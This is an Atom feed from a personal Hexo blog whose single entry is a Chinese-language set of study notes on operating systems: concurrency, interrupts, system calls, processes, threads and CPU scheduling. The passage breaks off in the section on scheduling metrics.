<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-19T14:19:35.122Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>操作系统</title>
    <link href="http://example.com/posts/d04bd5bc.html"/>
    <id>http://example.com/posts/d04bd5bc.html</id>
    <published>2022-04-15T02:47:14.758Z</published>
    <updated>2022-04-19T14:19:35.122Z</updated>
    
    <content type="html"><![CDATA[<p>这个笔记是基于 <a href="https://www.bilibili.com/video/BV1YE411D7nH?p=1">王道考研 操作系统</a> 写的，先试试看合不合适我吧。</p><span id="more"></span><h1 id="1-操作系统概述"><a href="#1-操作系统概述" class="headerlink" title="1. 操作系统概述"></a>1. 操作系统概述</h1><p>操作系统（英语：Operating System，缩写：OS）是管理计算机硬件与软件资源的系统软件，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h2 id="1-1-操作系统的功能"><a href="#1-1-操作系统的功能" class="headerlink" title="1.1 操作系统的功能"></a>1.1 操作系统的功能</h2><ol><li><p>作为系统资源的管理者：文件管理、设备管理、内存管理、处理机制(进程管理)</p><p>目标：安全、高效</p></li><li><p>作为用户和计算机硬件之间的接口：命令接口、程序接口(系统调用)、图形用户界面(GUI)</p><p>目标：方便用户使用</p></li><li><p>作为最接近硬件层次：实现对硬件及其的扩展</p></li></ol><h2 id="1-2-操作系统的特征"><a href="#1-2-操作系统的特征" class="headerlink" title="1.2 操作系统的特征"></a>1.2 操作系统的特征</h2><h3 id="1-2-1-并发"><a href="#1-2-1-并发" class="headerlink" title="1.2.1 并发"></a>1.2.1 并发</h3><p>并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。</p><p>并行：指两个或多个事件在同一时刻同时发生。</p><p>操作系统的并发性指计算机系统中同时存在着多个运行着的程序。操作系统通过引入进程与线程，使得程序能够并发运行。</p><h3 id="1-2-2-共享"><a href="#1-2-2-共享" class="headerlink" title="1.2.2 共享"></a>1.2.2 共享</h3><p>共享：指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>有两种共享方式：互斥共享和同时共享。</p><p>互斥共享：系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源。</p><p>同时共享：系统中的某些资源，允许一个时间段内由多个进程并发对它们进行访问。</p><h3 id="1-2-3-虚拟"><a href="#1-2-3-虚拟" class="headerlink" title="1.2.3 虚拟"></a>1.2.3 虚拟</h3><p>虚拟：把物理上的实体转换为多个逻辑上的对应物。物理实体是实际存在的，而逻辑上对应物是用户感受到的。</p><p>主要有两种虚拟技术：时分复用技术和空分复用技术。</p><p>多个进程在同一个处理器并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一个小时间片，并且这个时间片在进程之间互相切换。</p><p>虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间和物理内存使用页面进行交换。地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。</p><h3 id="1-2-4-异步"><a href="#1-2-4-异步" class="headerlink" title="1.2.4 异步"></a>1.2.4 异步</h3><p>异步：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进。</p><blockquote><p>如果失去了并发性，则系统只能串行地处理各个进程，每个进程的执行会一贯到底。如果失去了并发性，则一个时间段内系统中只需运行一道程序，那么就失去了实现虚拟性的意义。同样共享也是建立在并发的基础上的，如果没有并发，共享是无法实现的。所以并发是共享、虚拟、异步的前提。</p></blockquote><h2 id="1-3-操作系统的发展和分类"><a href="#1-3-操作系统的发展和分类" class="headerlink" title="1.3 操作系统的发展和分类"></a>1.3 操作系统的发展和分类</h2><h3 id="1-3-1-手工操作阶段"><a href="#1-3-1-手工操作阶段" class="headerlink" title="1.3.1 手工操作阶段"></a>1.3.1 手工操作阶段</h3><p>主要缺点：用户独占全机、人机速度矛盾导致资源利用率极低</p><h3 id="1-3-2-批处理系统"><a href="#1-3-2-批处理系统" class="headerlink" title="1.3.2 批处理系统"></a>1.3.2 批处理系统</h3><h4 id="1-3-2-1-单道批处理系统"><a href="#1-3-2-1-单道批处理系统" class="headerlink" title="1.3.2.1 单道批处理系统"></a>1.3.2.1 单道批处理系统</h4><p>引入<strong>脱机输入/输出技术</strong>(用磁带完成)，并<strong>监督程序</strong>(操作系统的雏形)负责控制作业的输入、输出。</p><p>主要优点：缓解了一定程度的人机速度矛盾，资源利用率有所提升。</p><p>主要缺点：<strong>内存中仅能有一道程序运行</strong>，只有该程序运行结束之后才能调入下一道程序。<strong>CPU有大量时间是在空闲等待I/O完成</strong>。资源利用率依然很低。</p><h4 id="1-3-3-2-多道批处理系统"><a href="#1-3-3-2-多道批处理系统" class="headerlink" title="1.3.3.2 多道批处理系统"></a>1.3.3.2 多道批处理系统</h4><p>主要优点：多道程序<strong>并发</strong>执行，<strong>共享</strong>计算机资源。<strong>资源利用率大幅提升</strong>，CPU和其它资源保持“忙碌”状态，系统吞吐量增大。</p><p>主要缺点：用户响应时间长，<strong>没有人机交互功能</strong>(用户提交自己的作业之后就只能等待计算机处理完成，中间不能控制自己的作业运行)</p><h3 id="1-3-3-分时操作系统"><a href="#1-3-3-分时操作系统" class="headerlink" title="1.3.3 分时操作系统"></a>1.3.3 分时操作系统</h3><p>分时操作系统：计算机以<strong>时间片</strong>为单位<strong>轮流为各个用户/作业服务</strong>，各个用户可通过终端与计算机进行交互。</p><p>主要优点：用户请求可以被及时响应，<strong>解决了人机交互的问题</strong>。允许多个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感受不到别人的存在。</p><p>主要缺点：<strong>不能优先处理一些紧急任务</strong>。操作系统对各个用户/作业都是完全公平的，循环地为每个用户/作业服务一个时间片，不区分任务的紧急性。</p><h3 id="1-3-4-实时操作系统"><a href="#1-3-4-实时操作系统" class="headerlink" title="1.3.4 实时操作系统"></a>1.3.4 实时操作系统</h3><p>主要优点：<strong>能够优先响应一些紧急任务</strong>，某些紧急任务不需时间片排队。</p><p>在实时操作系统的控制下，计算机系统接收到外部信号后及时进行处理，并且<strong>要在严格的时限内处理完事件</strong>。实时操作系统的主要特点是<strong>及时性和可靠性</strong>。</p><script type="math/tex; mode=display">实时操作系统\begin{cases}硬实时系统：必须在绝对严格的规定时间内完成处理\\软实时系统：能接受偶尔违反时间规定\end{cases}</script><h2 id="1-4-操作系统的运行机制和体系结构"><a href="#1-4-操作系统的运行机制和体系结构" class="headerlink" title="1.4 操作系统的运行机制和体系结构"></a>1.4 操作系统的运行机制和体系结构</h2><script type="math/tex; mode=display">操作系统的运行机制和体系结构\begin{cases}运行机制\begin{cases}两种指令\begin{cases}特权指令：不允许用户程序使用\\非特权指令\end{cases}\\两种处理器状态\begin{cases}核心态(管态)：特权指令、非特权指令都可执行\\用户态(目态)：此时CPU只能执行非特权指令\end{cases}\\两种程序\begin{cases}内核程序：运行在核心态\\应用程序：运行在用户态\end{cases}\end{cases}\\操作系统内核\begin{cases}时钟管理：实现计时功能\\中断处理：负责实现中断机制\\原语\begin{cases}是一种特殊的程序\\处于操作系统最底层，是最接近硬件的部分\\这种程序的运行具有原子性——其运行只能一气呵成，不可中断\\运行时间较短，调用频繁\end{cases}\\对系统资源进行管理的功能\begin{cases}进程管理\\存储器管理\\设备管理\end{cases}\end{cases}\\操作系统的体系结构\begin{cases}大内核\begin{cases}将操作系统的主要功能模块都作为系统内核，运行在核心态\\优点：高性能\\缺点：内核代码庞大，结构混乱，难以维护\end{cases}\\微内核\begin{cases}只把最基本的功能保留在内核\\优点：内核功能少，结构清晰，方便维护\\缺点：需要频繁地在核心态和用户态之间切换，性能低\end{cases}\end{cases}\end{cases}</script><h2 id="1-5-中断和异常"><a href="#1-5-中断和异常" class="headerlink" title="1.5 中断和异常"></a>1.5 中断和异常</h2><p>发生了中断，意味着需要操作系统的介入，开展管理工作。由于操作系统的管理工作(比如进程切换、分配I/O设备等)需要使用特权指令，因此CPU要从用户态转为核心态。中断可以使CPU从用户态切换为核心态，使操作系统获得计算机的控制权。有了中断，才能实现多道程序并发执行。</p><p>用户态、核心态之间的切换是怎么实现的？</p><p>答：用户态 -&gt; 核心态是通过中断实现的，并且<strong>中断</strong>是<strong>唯一</strong>途径。</p><p>​        核心态 -&gt; 用户态的切换是通过执行一个特权指令，将程序状态字的标志位设置为“用户态”。</p><h3 id="1-5-1-中断的分类"><a href="#1-5-1-中断的分类" class="headerlink" title="1.5.1 中断的分类"></a>1.5.1 中断的分类</h3><script type="math/tex; mode=display">中断\begin{cases}内中断(也称异常、例外、陷入)\begin{cases}自愿中断——指令中断，如系统调用时使用的访管指令\\强迫中断\begin{cases}硬件故障，如缺页\\软件中断，如整数除0\end{cases}\end{cases}\\外中断(中断)\begin{cases}外设请求，如I/O操作完成发出的中断信号\\人工干预，如用户强行终止一个进程\end{cases}\end{cases}</script><p>内中断信号来源于CPU内部，与当前执行的指令有关；外中断信号来源于CPU外部，与当前执行的指令无关。</p><h3 id="1-5-2-外中断的处理过程"><a href="#1-5-2-外中断的处理过程" class="headerlink" title="1.5.2 外中断的处理过程"></a>1.5.2 外中断的处理过程</h3><ol><li>每条指令执行结束后，CPU检查是否有外部中断信号</li><li>若有外部中断信号，则需要保护被中断进程的CPU环境</li><li>根据中断信号类型转入相应的中断处理程序</li><li>恢复原进程的CPU环境并退出中断，返回原进程继续往下执行</li></ol><h2 id="1-6-系统调用"><a href="#1-6-系统调用" class="headerlink" title="1.6 系统调用"></a>1.6 系统调用</h2><p>系统调用是操作系统提供给应用程序(程序员/编程人员)使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。</p><p>应用程序通过系统调用请求操作系统。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作(如存储分配、I/O操作、文件管理等)，都必须通过系统调用的方式向操作系统提出服务请求，由操作系统代为完成。这样可以保证系统的稳定性和安全性，防止用户进行非法操作。</p><script type="math/tex; mode=display">系统调用(按功能分类)\begin{cases}设备管理：完成设备的请求/释放/启动等功能\\文件管理：完成文件的读/写/创建/删除等功能\\进程控制：完成进程的创建/撤销/阻塞/唤醒等功能\\进程通信：完成进程之间消息传递/信号传递等功能\\内存管理：完成内存的分配/回收等功能\end{cases}</script><p>系统调用相关处理涉及到对系统资源的管理、对进程的控制，这些功能需要执行一些特权指令才能完成，因此系统调用的相关处理需要在核心态下完成。</p><h3 id="1-6-1-系统调用和库函数的区别"><a href="#1-6-1-系统调用和库函数的区别" class="headerlink" title="1.6.1 系统调用和库函数的区别"></a>1.6.1 系统调用和库函数的区别</h3><p>系统调用是操作系统向上层提供的接口，有的库函数是对系统调用的进一步封装，当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用。</p><h3 id="1-6-2-系统调用背后的过程"><a href="#1-6-2-系统调用背后的过程" class="headerlink" title="1.6.2 系统调用背后的过程"></a>1.6.2 系统调用背后的过程</h3><ol><li>传递系统调用参数</li><li>执行陷入指令(如int 0x80)（用户态）</li><li>执行系统调用相应服务程序（核心态）</li><li>返回用户程序</li></ol><p>陷入指令是唯一一个只能在用户态执行，而不可在核心态执行的指令。</p><h1 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h1><p><strong>程序段、数据段、PCB</strong>三部分组成了<strong>进程实体(进程映像)</strong>。一般情况下，我们把进程实体就简称为进程。<strong>PCB是进程存在的唯一标志。</strong></p><script type="math/tex; mode=display">PCB\begin{cases}进程描述信息\begin{cases}进程标识符PID\\用户标识符UID\end{cases}\\进程控制和管理信息\begin{cases}进程当前状态\\进程优先级\end{cases}\\资源分配清单\begin{cases}程序段指针\\数据段指针\\键盘\\鼠标\end{cases}\\处理机相关信息\begin{cases}各种寄存器值\end{cases}\end{cases}</script><h2 id="2-1-进程的组成"><a href="#2-1-进程的组成" class="headerlink" title="2.1 进程的组成"></a>2.1 进程的组成</h2><script type="math/tex; mode=display">进程的组成\begin{cases}PCB\begin{cases}进程描述信息\\进程控制和管理信息\\资源分配清单\\处理机相关信息\end{cases}\\程序段：存放要执行的代码\\数据段：存放程序运行过程中处理的各种数据\end{cases}</script><p>操作系统所需的数据在PCB中，程序本身运行所需的数据在程序段和数据段中。</p><h2 id="2-2-进程的组织"><a href="#2-2-进程的组织" class="headerlink" title="2.2 进程的组织"></a>2.2 进程的组织</h2><p>在一个系统中，通常有数十、数百乃至数千个PCB。为了能对它们加以有效的管理，应该用适当的方式把这些PCB组织起来。</p><script type="math/tex; mode=display">进程的组织方式\begin{cases}链接方式\begin{cases}按照进程状态将PCB分为多个队列\\操作系统持有指向各个队列的指针\end{cases}\\索引方式\begin{cases}根据进程状态的不同，建立几张索引表\\操作系统持有指向各个索引表的指针\end{cases}\end{cases}</script><h2 id="2-3-进程的特征"><a href="#2-3-进程的特征" class="headerlink" title="2.3 进程的特征"></a>2.3 进程的特征</h2><ul><li>动态性：进程最基本的特征，进程是程序的一次执行过程，是动态地产生、变化和消亡的</li><li>并发性：内存中有多个进程实体，各进程可并发执行</li><li>独立性：进程是能独立运行、独立获得资源、独立接受调度的基本单位</li><li>异步性：各进程按各自独立的、不可预知的速度向前推进。异步性会导致并发程序执行结果的不确定性</li><li>结构性：每个进程都会配置一个PCB，从结构上看，进程由程序段、数据段和PCB组成</li></ul><h2 id="2-4-进程的状态"><a href="#2-4-进程的状态" class="headerlink" title="2.4 进程的状态"></a>2.4 进程的状态</h2><script type="math/tex; mode=display">进程的状态和转换\begin{cases}状态\begin{cases}运行状态：占有CPU，并在CPU上运行\\就绪状态：已经具备运行条件，但由于没有空闲CPU，而暂时不能运行\\阻塞状态：因等待某一事件而暂时不能运行\\创建状态：进程正在被创建，操作系统为进程分配资源，初始化PCB\\终止状态：进程正在从系统中撤销，操作系统会回收进程拥有的资源，撤销PCB\end{cases}\\进程状态间的转换\begin{cases}就绪态\to 运行态：进程被调度\\运行态\to就绪态：时间片到，或CPU被其他高优先级的进程抢占\\运行态\to 阻塞态：等待系统资源分配，或等待某事件发生(主动行为)\\阻塞态\to 就绪态：资源分配到位，等待的时间发生(被动行为)\end{cases}\end{cases}</script><p>单核处理机环境下，每一时刻最多只有一个进程处于运行态。如果是双核，则最多两个，以此类推。</p><p>注意：不能由阻塞态直接转换为运行态，也不能由就绪态直接转换为阻塞态。因为进入阻塞态是进程主动请求的，必然需要进程在运行时才能发出这种请求。</p><h2 id="2-5-进程控制"><a href="#2-5-进程控制" class="headerlink" title="2.5 进程控制"></a>2.5 进程控制</h2><p>进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能。</p><p>用原语实现进程控制。原语的特点是执行期间不允许中断，只能一气呵成。这种不可被中断的操作即原子操作。原语采用“关中断指令”和“开中断指令”实现。</p><script type="math/tex; mode=display">进程的创建\begin{cases}创建原语\begin{cases}1.申请空白PCB\\2.为新进程分配所需资源\\3.初始化PCB\\4.将PCB插入就绪队列\end{cases}\\引起进程创建的事件\begin{cases}用户登录：分时系统中，用户登陆成功，系统会为其建立一个新的进程\\作业调度：多道批处理系统中，有新的作业放入内存时，会为其建立一个新的进程\\提供服务：用户向操作系统提出某些请求时，会新建一个进程处理该请求\\应用请求：由用户进程主动请求创建一个子进程\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的终止\begin{cases}撤销原语\begin{cases}1.从PCB集合中找到终止进程的PCB\\2.若进程正在运行，立即剥夺CPU，将CPU分配给其他进程\\3.终止其所有子进程\\4.将该进程拥有的所有资源归还给父进程或操作系统\\5.删除PCB\end{cases}\\引起进程中止的事件\begin{cases}正常结束\\异常结束\\外界干预\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的阻塞\begin{cases}阻塞原语\begin{cases}1.找到要阻塞的进程对应的PCB\\2.保护进程运行现场，将PCB状态信息设置为阻塞态，暂时停止进程运行\\3.将PCB插入相应事件的等待队列\end{cases}\\引起进程阻塞的事件\begin{cases}需要等待系统分配某种资源\\需要等待相互合作的其它进程完成工作\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的唤醒\begin{cases}唤醒原语\begin{cases}1.在事件等待队列中找到PCB\\2.将PCB从等待队列移除，设置进程为就绪态\\3.将PCB插入就绪队列，等待被调度\end{cases}\\引起进程唤醒的事件：等待的事件发生\end{cases}</script><p>阻塞原语唤醒原语必须成对使用。</p><script type="math/tex; mode=display">进程的切换\begin{cases}切换原语\begin{cases}1.将运行环境信息存入PCB\\2.PCB移入相应队列\\3.选择另一个进程执行，并更新其PCB\\4.根据PCB恢复新进程所需的运行环境\end{cases}\\引起进程切换的事件\begin{cases}当前进程时间片到\\有更高优先级的进程到达\\当前进程主动阻塞\\当前进程终止\end{cases}\end{cases}</script><h2 id="2-6-进程通信"><a href="#2-6-进程通信" class="headerlink" title="2.6 进程通信"></a>2.6 进程通信</h2><script type="math/tex; mode=display">进程通信\begin{cases}共享存储\begin{cases}基于数据结构的共享\\基于存储区的共享\end{cases}\\消息传递\begin{cases}直接通信方式：消息直接挂到接收方的消息队列里\\间接通信方式：消息先发到中间体(信箱)\end{cases}\\管道通信\begin{cases}一个管道只能实现半双工通道\\写满时，不能再写。读空时，不能再读\\没写满，不能读。没读空，不能写\end{cases}\end{cases}</script><p>进程通信就是指进程之间的信息交换。进程是分配系统资源的单位(包括内存地址空间)，因此各进程拥有的内存地址空间相互独立。</p><p>为了保证安全，一个进程不能直接访问另一个进程的地址空间。但是进程之间的信息交换又是必须实现的，为了保证进程间的安全通信，操作系统提供了一些方法。</p><h3 id="2-6-1-共享存储"><a href="#2-6-1-共享存储" class="headerlink" title="2.6.1 共享存储"></a>2.6.1 共享存储</h3><p>两个进程对共享空间的访问必须是互斥的。</p><p>基于数据结构的共享：比如共享空间里只能放一个长度为10的数组。这种共享方式速度慢、限制多，是一种低级通信方式。</p><p>基于存储区的共享：在内存中画出一块共享存储区，数据的形式、存放位置都由进程控制，而不是操作系统。相比之下，这种共享方式速度更快，是一种高级通信方式。</p><h3 id="2-6-2-管道通信"><a href="#2-6-2-管道通信" class="headerlink" title="2.6.2 管道通信"></a>2.6.2 管道通信</h3><p>“管道”是指用于连接读写进程的一个共享文件，又名pipe文件。其实就是在内存中开辟一个大小固定的缓冲区。</p><ol><li><p>管道只能采用半双工通信，某一时间段内只能实现单向的传输。如果要实现双向同时通信，则需要设置两个管道。</p></li><li><p>各进程要互斥地访问管道。</p></li><li><p>数据以字符流的形式写入管道，当管道写满时，写进程的write() 系统调用将被阻塞，等待读进程将数据取走。当读进程将数据全部取走后，管道变空，此时读进程的read() 系统调用将被阻塞。（缓冲区的特性）</p></li><li><p>如果没写满，就不允许读。如果没读空，就不允许写。（缓冲区的特性）</p></li><li><p>数据一旦被读出，就从管道中被抛弃，这就意味着读进程最多只能有一个，否则可能会有读错数据的情况。</p></li></ol><h3 id="2-6-3-消息传递"><a href="#2-6-3-消息传递" class="headerlink" title="2.6.3 消息传递"></a>2.6.3 消息传递</h3><p>进程间的数据交换以格式化的消息（Message）为单位。进程通过操作系统提供的“发送消息/接收消息”两个原语进行数据交换。</p><ul><li>直接消息传递：消息直接挂到接收进程的消息缓冲队列上</li><li>间接消息传递：消息要先发送到中间实体(信箱)中，因此也称“信箱通信方式”。如：计网中的电子邮件系统</li></ul><h2 id="2-7-线程"><a href="#2-7-线程" class="headerlink" title="2.7 线程"></a>2.7 线程</h2><p>有的进程可能需要“同时”做很多事，而传统的进程只能串行地执行一系列程序。为此，引入了“线程”，来增加并发度。可以把线程理解为“轻量级进程”。</p><p><strong>线程是一个基本的CPU执行单元，也是程序执行流的最小单位</strong>。引入线程之后，不仅是进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务。引入线程后，进程只作为除CPU之外的系统资源的分配单元。</p><h3 id="2-7-1-线程的实现方式"><a href="#2-7-1-线程的实现方式" class="headerlink" title="2.7.1 线程的实现方式"></a>2.7.1 线程的实现方式</h3><p>用户级线程由应用程序通过线程库实现。所有的线程管理工作都由应用程序负责(包括线程切换)，用户级线程中，线程切换可以在用户态下即可完成，无需操作系统干预。</p><p>内核级线程的管理工作由操作系统内核完成。线程调度、切换等工作都由内核负责，因此内核级线程的切换必然需要在核心态下才能完成。</p><p>注意：操作系统只“看得见”内核级线程，因此只有内核级线程才是处理机分配的单位。</p><h3 id="2-7-2-多线程模型"><a href="#2-7-2-多线程模型" class="headerlink" title="2.7.2 多线程模型"></a>2.7.2 多线程模型</h3><p>在同时支持用户级线程和内核级线程的系统中，由几个用户级线程映射到几个内核级线程的问题引出了“多线程模型”问题。</p><p>多对一模型：多个用户级线程映射到一个内核级线程。每个用户进程只对应一个内核级线程。</p><blockquote><p>优点：用户级线程的切换在用户空间即可完成，不需要切换到核心态，线程管理的系统开销小，效率高</p><p>缺点：当一个用户级线程被阻塞后，整个进程都会被阻塞，并发度不高。多个线程不可在多核处理机上并行运行</p></blockquote><p>一对一模型：一个用户级线程映射到一个内核级线程。每个用户进程有与用户级线程同数量的内核级线程。</p><blockquote><p>优点：当一个线程被阻塞后，别的线程还可以继续执行，并发能力强。多线程可在多核处理机上并行执行</p><p>缺点：一个用户进程会占用多个内核级线程，线程切换由操作系统内核完成，需要切换到核心态，因此线程管理的成本高，开销大</p></blockquote><p>多对多模型：n 用户级线程映射到m 个内核级线程（n &gt;= m）。每个用户进程对应 m 个内核级线程。</p><blockquote><p>优点：克服了多对一模型并发度不高的缺点(一个阻塞全体阻塞)，又克服了一对一模型中一个用户进程占用太多内核级线程，开销太大的缺点</p></blockquote><h2 id="2-8-处理机调度"><a href="#2-8-处理机调度" class="headerlink" title="2.8 处理机调度"></a>2.8 处理机调度</h2><p>当有一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序，这就是“调度”研究的问题。</p><p>在多道程序系统中，进程的数量往往是多于处理机的个数的，这样不可能同时并行地处理各个进程。处理机调度，就是从就绪队列中按照一定的算法选择一个进程并将处理机分配给它运行，以实现进程的并发执行。</p><h3 id="2-8-1-调度的三个层次"><a href="#2-8-1-调度的三个层次" class="headerlink" title="2.8.1 调度的三个层次"></a>2.8.1 调度的三个层次</h3><h4 id="2-8-1-1-高级调度-作业调度"><a href="#2-8-1-1-高级调度-作业调度" class="headerlink" title="2.8.1.1 高级调度(作业调度)"></a>2.8.1.1 高级调度(作业调度)</h4><p>由于内存空间有限，有时无法将用户提交的作业全部放入内存，因此就需要确定某种规则来决定将作业调入内存的顺序。</p><p>高级调度（作业调度），按一定的原则从外存上处于后备队列的作业中挑选一个（或多个）作业，给他们分配内存等必要资源，并建立相应的进程（建立PCB），以使它（们）获得竞争处理机的权利。</p><p>高级调度是辅存（外存）与内存之间的调度。每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，但调出的时机必然是作业运行结束才调出。</p><h4 id="2-8-1-2-中级调度-内存调度"><a href="#2-8-1-2-中级调度-内存调度" class="headerlink" title="2.8.1.2 中级调度(内存调度)"></a>2.8.1.2 中级调度(内存调度)</h4><p>引入了虚拟存储技术之后，可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存又稍有空闲时，再重新调入内存。这么做的目的是为了提高内存利用率和系统吞吐量。</p><p>暂时调到外存等待的进程状态为挂起状态。值得注意的是，PCB并不会一起调到外存，而是会常驻内存。PCB中会记录进程数据在外存中的存放位置，进程状态等信息，操作系统通过内存中的PCB来保持对各个进程的监控、管理。被挂起的进程PCB会被放到的挂起队列中。</p><p>中级调度（内存调度），就是要决定将哪个处于挂起状态的进程重新调入内存。</p><p>一个进程可能会被多次调出、调入内存，因此中级调度发生的频率要比高级调度更高。</p><h4 id="2-8-1-3-低级调度-进程调度"><a href="#2-8-1-3-低级调度-进程调度" class="headerlink" title="2.8.1.3 低级调度(进程调度)"></a>2.8.1.3 低级调度(进程调度)</h4><p>低级调度（进程调度），其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。</p><p>进程调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置进程调度。进程调度的频率很高，一般几十毫秒一次。</p><img src="/posts/d04bd5bc/2.8.1.png" class="" title="处理机调度的三个层次"><h3 id="2-8-2-进程的挂起态与七状态模型"><a href="#2-8-2-进程的挂起态与七状态模型" class="headerlink" title="2.8.2 进程的挂起态与七状态模型"></a>2.8.2 进程的挂起态与七状态模型</h3><p>暂时调到外存等待的进程状态为挂起状态（挂起态，suspend）。</p><p>挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。</p><p>五状态模型 -&gt; 七状态模型</p><img src="/posts/d04bd5bc/2.8.2.png" class="" title="七状态模型"><p>注意“挂起”和“阻塞”的区别，两种状态都是暂时不能获得CPU的服务，但挂起态是将进程映像调到外存去了，而阻塞态下进程映像还在内存中。</p><p>有的操作系统会把就绪挂起、阻塞挂起分为两个挂起队列，甚至会根据阻塞原因不同再把阻塞挂起进程进一步细分为多个队列。</p><h3 id="2-8-3-进程调度的时机"><a href="#2-8-3-进程调度的时机" class="headerlink" title="2.8.3 进程调度的时机"></a>2.8.3 进程调度的时机</h3><p>进程调度（低级调度），就是按照某种算法从就绪队列中选择一个进程为其分配处理机。</p><img src="/posts/d04bd5bc/2.8.3.png" class="" title="进程调度切换"><p>临界资源：一个时间段内只允许一个进程使用的资源。各进程需要互斥地访问临界资源。</p><p>临界区：访问临界资源的那段代码。</p><p><strong>内核程序临界区</strong>一般是用来访问某种内核数据结构的，比如进程的就绪队列（由各就绪进程的PCB组成）。</p><p>进程在<strong>操作系统内核程序临界区</strong>不能进行调度与切换。（√）</p><p>进程处于<strong>临界区</strong>时不能进行处理机调度。（×）</p><h3 id="2-8-4-进程调度的方式"><a href="#2-8-4-进程调度的方式" class="headerlink" title="2.8.4 进程调度的方式"></a>2.8.4 进程调度的方式</h3><ul><li><p>非剥夺调度方式，又称非抢占方式。即，只允许程主动放弃处理机。在运行过程中即便有更紧迫的任务到达，当前进程依然会继续使用处理机，直到该进程终止或主动要求进入阻塞态。</p><p>实现简单，系统开销小但是无法及时处理紧急任务，适合于早期的批处理系统。</p></li><li><p>剥夺调度方式，又称抢占方式。当一个进程正在处理机上执行时，如果有一个更重要或更紧迫的进程需要使用处理机，则立即暂停正在执行的进程，将处理机分配给更重要紧迫的那个进程。</p><p>可以优先处理更紧急的进程，也可实现让各进程按时间片轮流执行的功能（通过时钟中断）。适合于分时操作系统、实时操作系统。</p></li></ul><h3 id="2-8-5-进程的切换与过程"><a href="#2-8-5-进程的切换与过程" class="headerlink" title="2.8.5 进程的切换与过程"></a>2.8.5 进程的切换与过程</h3><p>“狭义的进程调度”与“进程切换”的区别：狭义的进程调度指的是从就绪队列中选中一个要运行的进程（这个进程可以是刚刚被暂停执行的进程，也可能是另一个进程，后一种情况就需要进程切换）；进程切换是指一个进程让出处理机，由另一个进程占用处理机的过程。</p><p>广义的进程调度包含了<strong>选择一个进程</strong>和<strong>进程切换</strong>两个步骤。</p><p>进程切换的过程主要完成了：</p><ol><li><p>对原来运行进程各种数据的保存</p></li><li><p>对新的进程各种数据的恢复<br>（如：程序计数器、程序状态字、各种数据寄存器等处理机现场信息，这些信息一般保存在进程控制块）</p></li></ol><p>注意：进程切换是有代价的，因此如果过于频繁的进行进程调度、切换，必然会使整个系统的效率降低，使系统大部分时间都花在了进程切换上，而真正用于执行进程的时间减少。</p><h3 id="2-8-6-调度算法的评价指标"><a href="#2-8-6-调度算法的评价指标" class="headerlink" title="2.8.6 调度算法的评价指标"></a>2.8.6 调度算法的评价指标</h3><h4 id="2-8-6-1-CPU利用率"><a href="#2-8-6-1-CPU利用率" class="headerlink" title="2.8.6.1 CPU利用率"></a>2.8.6.1 CPU利用率</h4><p>CPU利用率：指CPU “忙碌”的时间占总时间的比例。</p><script type="math/tex; mode=display">利用率 = \frac{忙碌的时间}{总时间}</script><p>例：某计算机只支持单道程序，某个作业刚开始需要在CPU上运行5秒，再用打印机打印输出5秒，之后再执行5秒，才能结束。在此过程中，CPU利用率、打印机利用率分别是多少？</p><script type="math/tex; mode=display">CPU利用率 = \frac{5+5}{5+5+5} = 66.6\%\\\\打印机利用率 = \frac{5}{5+5+5} = 33.3\%</script><h4 id="2-8-6-2-系统吞吐量"><a href="#2-8-6-2-系统吞吐量" class="headerlink" title="2.8.6.2 系统吞吐量"></a>2.8.6.2 系统吞吐量</h4><p>系统吞吐量：单位时间内完成作业的数量。</p><script type="math/tex; mode=display">系统吞吐量 = \frac{总共完成了多少道作业}{总共花了多少时间}</script><p>例：某计算机系统处理完10道作业，共花费100秒，则系统吞吐量为？</p><script type="math/tex; mode=display">系统吞吐量 = \frac{10}{100}=0.1道/秒</script><h4 id="2-8-6-3-周转时间"><a href="#2-8-6-3-周转时间" class="headerlink" title="2.8.6.3 周转时间"></a>2.8.6.3 